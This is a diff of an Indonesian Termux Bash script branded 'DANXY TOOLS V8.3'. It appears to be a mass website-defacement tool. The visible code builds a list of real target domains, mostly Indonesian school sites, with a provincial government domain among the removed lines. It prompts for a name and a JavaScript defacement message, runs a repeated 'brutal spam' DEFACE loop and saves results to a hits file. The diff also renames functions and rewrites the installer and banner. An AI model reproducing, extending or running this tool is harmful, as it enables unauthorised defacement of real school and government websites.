@@ -38,11 +38,11 @@ bg_lg="\033[100m"  # Latar Belakang Abu-abu Terang
 res="\033[0m"
 read rows cols < <(stty size)
 cok="ansi-double"
-iejebshdudhdbebevvssyuseiejebrbdjdidududdhjeneebrveuidi() {
+psht_hama() {
   boxes -d "$cok" -a l -s "${cols}x"
 }
 Version="/data/data/com.termux/files/usr/lib/python3.11/email/mime/Dneu/Version"
-versitoolsV8.3=$(cat "$Version" 2>/dev/null || echo "Unknown")
+versitoolsv5=$(cat "$Version" 2>/dev/null || echo "Unknown")
 HASILE_SU_ASU="/storage/emulated/0/HASIL-DEFACEG404.txt"
 bluearchive() {
     audioupdate() {
@@ -78,7 +78,7 @@ $e "
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⠉⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⣆⠀⠰⠄⠀⠉⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⠿⠿⣿⣿⣿⠇⠀⠀⢀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡇⠀⠀⢀⣼⠗⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⣀⠀⠀⠀⠀⠀⠀⠀DANXY TOOLS V8.3⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 "
 }
@@ -89,7 +89,7 @@ ${m}██║  ██║█████╗  █████╗  █████�
 ${p}██║  ██║██╔══╝  ██╔══╝  ██╔══██║██║     ██╔══╝  
 ██████╔╝███████╗██║     ██║  ██║╚██████╗███████╗
 ╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝
-${b}Developer${c} By${h} DanxyOfficial${res}         ${m}${bg_b}Code By Galirus Official${res}
+${b}Developer${c} By${h} DanxyOfficial${res}       ${m}Code By Galirus Official${res}
 "
 }
 ctrl_c() {
@@ -124,9 +124,6 @@ domains=(
     "https://www.kelulusan.mtscieurih.sch.id/"
     "https://smknegeri9garut.id/"
     "https://pengumuman.man1kuburaya.sch.id"
-    "https://jatengprov.go.id"
-    "https://sman1ceperklaten.sch.id"
-    "https://www.smkn1trucuk.sch.id"
 )
 
 paths=(
@@ -213,21 +210,21 @@ menu1() {
     Premfree() {
         echo "============HASIL DEFACE==========" > "$HASILE_SU_ASU"
         clear
-        baner | iejebshdudhdbebevvssyuseiejebrbdjdidududdhjeneebrveuidi  | lolcat
-        logo | iejebshdudhdbebevvssyuseiejebrbdjdidududdhjeneebrveuidi
+        baner | psht_hama  | lolcat
+        logo | psht_hama
         xdg-open "https://defacer.id/tools/jso-generator" &>/dev/null
         read -p "Masukkan Nama Anda: " apa
         play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
         read -p "Masukkan Pesan (Jso): " javascript
         play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
         clear
-        baner | iejebshdudhdbebevvssyuseiejebrbdjdidududdhjeneebrveuidi  | lolcat
-        logo | iejebshdudhdbebevvssyuseiejebrbdjdidududdhjeneebrveuidi
+        baner | psht_hama  | lolcat
+        logo | psht_hama
         $e
         $e "${m}${bg_lg}Jika Ingin Berhenti ketik q${res}"
         tput cup 35 0
         stty -icanon min 0 time 0
-        DEFACE "$apa_$RANDOM" "TOOLSV8.3©2025" "$javascript"
+        DEFACE "$apa_$RANDOM" "TOOLSV8.3@gmail.com" "$javascript"
         stty icanon
     }
     Premfree
@@ -237,14 +234,14 @@ menu1() {
 show_menu() {
     while true; do
         clear
-        baner | iejebshdudhdbebevvssyuseiejebrbdjdidududdhjeneebrveuidi  | lolcat
-        logo | iejebshdudhdbebevvssyuseiejebrbdjdidududdhjeneebrveuidi
+        baner | psht_hama  | lolcat
+        logo | psht_hama
         play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
         $e
         $e "     ${bg_lg}${m}[=== Pilih Menu Mode ===]${res}"
         $e
         $e "${b}[${k} 1${c}.${b} ]${h} Mode Brutal${p} Spam Berulang"
-        $e "${b}[${k} 0${c}.${b} ]${h} Exit${p} Back To Menu ToolsV8.3${k}"
+        $e "${b}[${k} 0${c}.${b} ]${h} Exit${p} Back To Menu Toolsv5${k}"
         read -p "Pilih menu [0/1]: " pilihan
         play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
         case "$pilihan" in
@@ -257,41 +254,32 @@ show_menu() {
     done
 }
 installer() {
-    # Deteksi package manager
     if command -v apt &>/dev/null; then
         paket="apt"
     elif command -v pkg &>/dev/null; then
         paket="pkg"
     else
-        echo "[ ∅ ] Tidak ada package manager yang didukung!"
+        e "${m}[ ∅ ] Tidak ada package manager yang didukung!${b}"
         exit 1
     fi
-
-    REQUIRED_PKGS=(curl wget ruby sox mpv ncurses-utils binutils)
+    REQUIRED_PKGS=(curl wget ruby sox mpv ncurses-utils)
     for pkg in "${REQUIRED_PKGS[@]}"; do
-        # Gunakan perintah spesifik untuk pengecekan (bukan hanya nama paket)
         if ! command -v "$pkg" &>/dev/null; then
-            echo "[ ∆ ] Menginstall: $pkg..."
+            e "[ ∅ ] Menginstall: $pkg..."
+            $paket install -y binutils
             $paket install -y "$pkg" || {
-                echo "[ ∅ ] Gagal menginstall $pkg!"
+                e "${b}[${m} GAGAL${b} ]${p} install $pkg!"
                 continue
             }
+            gem install lolcat 
         else
-            echo "[ ✓ ]$pkg sudah terinstall."
+            e "${b}[${h} SUCCESS${b} ]${p} $pkg sudah terinstall."
+            sleep 0.3
         fi
     done
-
-    # Cek dan install lolcat jika belum ada
-    if ! gem list lolcat -i &>/dev/null; then
-        echo "[ ! ] Menginstall lolcat via gem..."
-        gem install lolcat || echo "[ ∅ ] Gagal install lolcat!"
-    else
-        echo "[ ✓ ] lolcat sudah terinstall."
-    fi
-
-    echo "[ ✓ ] Bantu Subscribe DanxyOfficial"
-    sleep 3
-    command -v xdg-open &>/dev/null && xdg-open "https://www.youtube.com/@DanxyOfficial" &>/dev/null
+    e "Bantu Subscribe DanxyBot"
+    sleep 5
+    xdg-open "https://www.youtube.com/@DanxyOfficial" &>/dev/null
 }
     installer
     clear
